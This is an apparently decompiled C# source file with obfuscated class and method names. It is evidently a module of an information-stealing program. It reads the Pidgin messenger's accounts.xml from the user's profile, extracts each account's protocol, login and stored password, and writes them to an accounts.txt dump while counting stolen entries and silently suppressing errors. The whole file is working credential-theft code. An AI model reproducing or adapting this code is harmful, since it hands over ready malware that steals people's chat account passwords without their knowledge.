using System.IO;
using System.Text;
using System.Xml;
using ns13;

namespace ns6;

internal sealed class Class26
{
	private static StringBuilder stringBuilder_0 = new StringBuilder();

	private static readonly string string_0 = Path.Combine(Class56.string_3, ".purple\\accounts.xml");

	public static void smethod_0(string string_1)
	{
		if (!File.Exists(string_0))
		{
			return;
		}
		try
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(new XmlTextReader(string_0));
			foreach (XmlNode childNode in xmlDocument.DocumentElement!.ChildNodes)
			{
				string innerText = childNode.ChildNodes[0]!.InnerText;
				string innerText2 = childNode.ChildNodes[1]!.InnerText;
				string innerText3 = childNode.ChildNodes[2]!.InnerText;
				if (!string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3))
				{
					stringBuilder_0.AppendLine("Protocol: " + innerText);
					stringBuilder_0.AppendLine("Login: " + innerText2);
					stringBuilder_0.AppendLine("Password: " + innerText3 + "\r\n");
					Class55.int_8++;
					continue;
				}
				break;
			}
			if (stringBuilder_0.Length > 0)
			{
				Directory.CreateDirectory(string_1);
				File.AppendAllText(string_1 + "\\accounts.txt", stringBuilder_0.ToString());
			}
		}
		catch
		{
		}
	}
}
